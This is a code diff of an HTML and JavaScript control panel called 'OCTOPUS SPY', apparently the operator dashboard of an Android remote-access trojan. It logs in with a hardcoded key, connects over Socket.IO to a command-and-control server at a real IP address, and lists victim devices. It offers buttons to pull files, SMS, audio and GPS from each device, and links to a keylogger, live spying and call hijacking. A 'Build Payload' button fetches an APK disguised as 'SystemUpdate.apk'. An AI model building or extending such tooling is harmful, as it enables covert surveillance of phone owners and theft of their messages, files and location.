@@ -7,104 +7,41 @@
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* High-End Tech Fonts */
         @import url('https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono:wght@300;500&display=swap');
-        
-        :root { 
-            --red: #ff1a1a; 
-            --bg: #020202; 
-            --panel: #080808; 
-            --border: #151515;
-            --font-main: 'JetBrains Mono', monospace;
-            --font-head: 'Syne', sans-serif;
-        }
-        
+        :root { --red: #ff1a1a; --bg: #020202; --panel: #080808; --border: #151515; --font-main: 'JetBrains Mono', monospace; --font-head: 'Syne', sans-serif; }
         * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
-
-        /* Custom Elite Scrollbar */
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #000; }
         ::-webkit-scrollbar-thumb { background: var(--red); border-radius: 10px; box-shadow: 0 0 10px var(--red); }
-
-        body { 
-            background: var(--bg); 
-            color: #fff; 
-            font-family: var(--font-main); 
-            display: flex; 
-            height: 100vh; 
-            overflow: hidden; 
-        }
-
-        /* Minimal Tech Login */
-        #login-overlay { 
-            position: fixed; inset: 0; background: #000; z-index: 9999; 
-            display: flex; justify-content: center; align-items: center; 
-        }
+        body { background: var(--bg); color: #fff; font-family: var(--font-main); display: flex; height: 100vh; overflow: hidden; }
+        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
         .login-wrap { width: 320px; text-align: center; }
         .login-wrap h1 { font-family: var(--font-head); font-size: 28px; color: var(--red); letter-spacing: -1px; margin-bottom: 5px; }
         .login-wrap p { font-size: 10px; color: #444; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 2px; }
-        .login-input { 
-            width: 100%; padding: 15px; background: transparent; border: none; 
-            border-bottom: 2px solid #222; color: var(--red); text-align: center; 
-            font-family: var(--font-main); font-size: 16px; transition: 0.4s;
-        }
+        .login-input { width: 100%; padding: 15px; background: transparent; border: none; border-bottom: 2px solid #222; color: var(--red); text-align: center; font-family: var(--font-main); font-size: 16px; transition: 0.4s; }
         .login-input:focus { border-bottom-color: var(--red); }
-        .login-btn { 
-            margin-top: 30px; background: transparent; color: #fff; border: 1px solid #333; 
-            padding: 10px 25px; cursor: pointer; font-family: var(--font-head); font-size: 11px;
-            transition: 0.3s;
-        }
+        .login-btn { margin-top: 30px; background: transparent; color: #fff; border: 1px solid #333; padding: 10px 25px; cursor: pointer; font-family: var(--font-head); font-size: 11px; transition: 0.3s; }
         .login-btn:hover { background: var(--red); border-color: var(--red); box-shadow: 0 0 15px var(--red); }
-
-        /* Sidebar Navigation */
-        nav { 
-            width: 280px; background: var(--panel); border-right: 1px solid var(--border); 
-            display: flex; flex-direction: column; padding: 40px 0; 
-        }
+        nav { width: 280px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 40px 0; }
         .brand { padding: 0 40px 40px 40px; font-family: var(--font-head); font-size: 22px; color: var(--red); }
-        
-        .nav-item { 
-            padding: 16px 40px; display: flex; align-items: center; color: #555; 
-            text-decoration: none; font-size: 12px; font-weight: 500; cursor: pointer; 
-            transition: 0.2s; border-left: 3px solid transparent;
-        }
+        .nav-item { padding: 16px 40px; display: flex; align-items: center; color: #555; text-decoration: none; font-size: 12px; font-weight: 500; cursor: pointer; transition: 0.2s; border-left: 3px solid transparent; }
         .nav-item i { width: 25px; font-size: 14px; margin-right: 15px; }
         .nav-item:hover, .nav-item.active { color: #fff; background: #0c0c0c; border-left-color: var(--red); }
-
-        /* Main Workspace */
         main { flex: 1; display: flex; flex-direction: column; }
-        header { 
-            height: 80px; border-bottom: 1px solid var(--border); 
-            display: flex; align-items: center; justify-content: space-between; 
-            padding: 0 50px; background: #030303; 
-        }
+        header { height: 80px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 50px; background: #030303; }
         .view-name { font-family: var(--font-head); font-size: 14px; color: #fff; text-transform: uppercase; }
-        
         .content { flex: 1; padding: 50px; overflow-y: auto; }
         #target-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); gap: 30px; }
-
-        /* Target Card */
         .card { background: #0a0a0a; border: 1px solid var(--border); border-radius: 12px; padding: 30px; }
         .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
         .target-name { font-family: var(--font-head); font-size: 16px; color: var(--red); }
-        
         .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .action-btn { 
-            background: #0d0d0d; border: 1px solid #1a1a1a; color: #888; 
-            padding: 12px; font-size: 11px; cursor: pointer; border-radius: 6px;
-            display: flex; align-items: center; justify-content: center; transition: 0.2s;
-        }
+        .action-btn { background: #0d0d0d; border: 1px solid #1a1a1a; color: #888; padding: 12px; font-size: 11px; cursor: pointer; border-radius: 6px; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
         .action-btn i { margin-right: 10px; font-size: 12px; }
         .action-btn:hover { background: #fff; color: #000; border-color: #fff; }
-
-        @media (max-width: 768px) {
-            nav { display: none; }
-            header { padding: 0 20px; }
-        }
     </style>
 </head>
 <body>
-
     <div id="login-overlay">
         <div class="login-wrap">
             <h1>OCTOPUS SPY</h1>
@@ -113,7 +50,6 @@
             <button class="login-btn" onclick="login()">ESTABLISH LINK</button>
         </div>
     </div>
-
     <nav>
         <div class="brand">OCTOPUS</div>
         <div class="nav-item active" onclick="tab('Live')"><i class="fa-solid fa-ghost"></i> Live Targets</div>
@@ -122,74 +58,43 @@
         <div class="nav-item" onclick="tab('Keys')"><i class="fa-solid fa-keyboard"></i> Keylogger</div>
         <div class="nav-item" onclick="tab('Spy')"><i class="fa-solid fa-eye"></i> Live Spy</div>
         <div class="nav-item" onclick="tab('Sms')"><i class="fa-solid fa-message"></i> SMS Manager</div>
-        <div class="nav-item" onclick="tab('Calls')"><i class="fa-solid fa-phone"></i> Call Hijack</div>
-        <div class="nav-item" onclick="tab('Apps')"><i class="fa-solid fa-table-cells"></i> App Manager</div>
-        <div class="nav-item" onclick="tab('Guide')"><i class="fa-solid fa-book"></i> User Guide</div>
         <div class="nav-item" onclick="download()" style="margin-top:auto; color:var(--red)"><i class="fa-solid fa-virus"></i> Build Payload</div>
     </nav>
-
     <main>
         <header>
             <div class="view-name" id="view-title">LIVE_TARGETS</div>
-            <div id="status" style="font-size: 10px; color: #444; font-weight: 300;">C2_DISCONNECTED</div>
+            <div id="status" style="font-size: 10px; color: #444;">C2_DISCONNECTED</div>
         </header>
-
-        <div class="content">
-            <div id="target-grid"></div>
-        </div>
+        <div class="content"><div id="target-grid"></div></div>
     </main>
-
     <script>
         let socket;
         const SERVER_URL = "http://51.68.234.157:20211";
-
         function login() {
             if(document.getElementById('pass').value === "octopus_xx1") {
-                document.getElementById('login-overlay').style.opacity = '0';
-                setTimeout(() => document.getElementById('login-overlay').remove(), 400);
-                startC2();
-            } else { alert("KEY_ERROR: ACCESS DENIED"); }
+                socket = io(SERVER_URL, { query: { type: 'mastermind', key: 'octopus_xx1' } });
+                socket.on('connect', () => {
+                    document.getElementById('login-overlay').remove();
+                    document.getElementById('status').innerText = "C2_CONNECTED // TUNNEL_ACTIVE";
+                    document.getElementById('status').style.color = "#0f0";
+                    initListeners();
+                });
+            } else { alert("ACCESS DENIED"); }
         }
-
-        function tab(name) {
-            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-            event.currentTarget.classList.add('active');
-            document.getElementById('view-title').innerText = name.toUpperCase() + "_VIEW";
-        }
-
-        function download() { window.open("https://github.com/octopus29129/apkk/raw/main/SystemUpdate.apk", '_blank'); }
-
-        function startC2() {
-            socket = io(SERVER_URL, { query: { type: 'mastermind', key: 'octopus_xx1' } });
-            socket.on('connect', () => {
-                document.getElementById('status').innerText = "C2_CONNECTED // TUNNEL_ACTIVE";
-                document.getElementById('status').style.color = "#0f0";
-            });
-
+        function download() { window.open(`${SERVER_URL}/download-payload`, '_blank'); }
+        function initListeners() {
+            socket.on('notification', (data) => { alert(`[!] ${data.title}: ${data.message}`); });
             socket.on('update_dashboard', (res) => {
                 let grid = document.getElementById('target-grid');
                 let card = document.getElementById(res.id);
                 if(!card) {
                     card = document.createElement('div');
-                    card.id = res.id;
-                    card.className = 'card';
+                    card.id = res.id; card.className = 'card';
                     grid.prepend(card);
                 }
-                card.innerHTML = `
-                    <div class="card-header">
-                        <span class="target-name">${res.data.model || 'ANDROID_NODE'}</span>
-                        <span style="font-size:9px; color:#333;">${res.id}</span>
-                    </div>
-                    <div class="btn-grid">
-                        <button class="action-btn" onclick="send('${res.id}', 'browse')"><i class="fa-solid fa-folder"></i> FILES</button>
-                        <button class="action-btn" onclick="send('${res.id}', 'mic')"><i class="fa-solid fa-microphone"></i> AUDIO</button>
-                        <button class="action-btn" onclick="send('${res.id}', 'sms')"><i class="fa-solid fa-comment-dots"></i> SMS</button>
-                        <button class="action-btn" onclick="send('${res.id}', 'gps')"><i class="fa-solid fa-location-crosshairs"></i> GPS</button>
-                    </div>
-                `;
+                card.innerHTML = `<div class="card-header"><span class="target-name">${res.data.model || 'ANDROID_NODE'}</span><span style="font-size:9px; color:#333;">${res.id}</span></div><div class="btn-grid"><button class="action-btn" onclick="send('${res.id}', 'browse')">FILES</button><button class="action-btn" onclick="send('${res.id}', 'sms')">SMS</button></div>`;
             });
         }
-
         function send(id, act) { socket.emit('run_action', { targetId: id, action: act }); }
     </script>
 </body>
